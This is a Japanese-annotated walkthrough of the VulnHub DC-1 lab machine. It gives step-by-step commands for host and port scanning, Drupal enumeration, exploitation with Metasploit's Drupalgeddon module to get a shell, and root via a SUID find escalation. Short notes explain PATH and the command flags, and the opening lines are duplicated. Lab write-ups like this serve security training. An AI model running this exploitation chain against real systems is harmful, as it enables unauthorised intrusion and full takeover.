# Attack DC-1 Machine

```bash
sudo ifconfig
sudo fping -aqg 192.168.56.0/24
export IP=192.168.56.104# VulnHub: DC-1 Machine Walkthrough

```bash
# ネットワークスキャンとターゲット特定
sudo ifconfig
sudo fping -aqg 192.168.56.0/24
export IP=192.168.56.104
echo $IP

# ポートスキャン
nmap -sC -sV -p 1-65535 $IP

# HTTPアクセス → /robots.txt を確認
export URL="http://$IP:80/"
echo $URL

# droopescan 環境構築
python3 -m venv ~/myenv
source ~/myenv/bin/activate
droopescan --help

# DHCP再取得（ネットワーク不安定時）
sudo dhclient -r
sudo dhclient
ip a

# droopescan インストールと実行
pip install droopescan
droopescan --help
ping $IP
droopescan scan drupal -u $URL

# MetasploitでDrupalの脆弱性を利用
msfconsole
search type:exploit drupal
use exploit/multi/http/drupal_drupageddon
info
set RHOSTS 192.168.56.104
show options
set LHOST 192.168.56.101
show options
# TARGETURIはデフォルトのままでOK
run

# シェル取得後の操作
ls
cat flag1.txt
shell
which python
python -c 'import pty; pty.spawn("/bin/bash")'

tty
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -la --color=auto'
ll

uname -a
cat /etc/*-release
cat /etc/issue

# ユーザーディレクトリ探索
cd /home
ll
cd flag4
ll
cat flag4.txt

# 履歴や一時ファイルの確認
cat .bash_history
cd /tmp
ll
cd /var/tmp
ll
cd /dev/shm
ll
file .tmpfs

# ディスク使用状況確認
df -h

# SUIDファイル探索と特権昇格
cd /
find / -perm -u=s -type f 2> /dev/null
which find
/usr/bin/find . -exec /bin/bash -p \; -quit

# root確認
id
whoami
cd /root
ls
```

---

## Side Notes

### PATHの構成と意味

- `/usr/local/sbin`：ローカルにインストールされたスーパーユーザー向けプログラム
- `/usr/local/bin`：ローカルにインストールされた一般ユーザー向けプログラム
- `/usr/sbin`：システム管理者向けプログラム
- `/usr/bin`：一般ユーザー向け標準コマンド
- `/sbin`：システム管理者用の基本コマンド
- `/bin`：基本的なコマンド（システム起動や操作に必要）
- `/usr/games`：ゲームプログラム
- `/tmp`：一時ファイル用（通常コマンドは置かない）

### `/bin/bash -p` の意味

- `-p`：privileged（特権モード）で起動。環境変数を無視してセキュリティ制限を回避。

### `\;` の意味

- `-exec` の終了を示す。`\;` はシェルによる解釈を避けるためにエスケープ。

### `-quit` の意味

- `find` コマンドを最初の一致で終了させ、効率を向上。

---
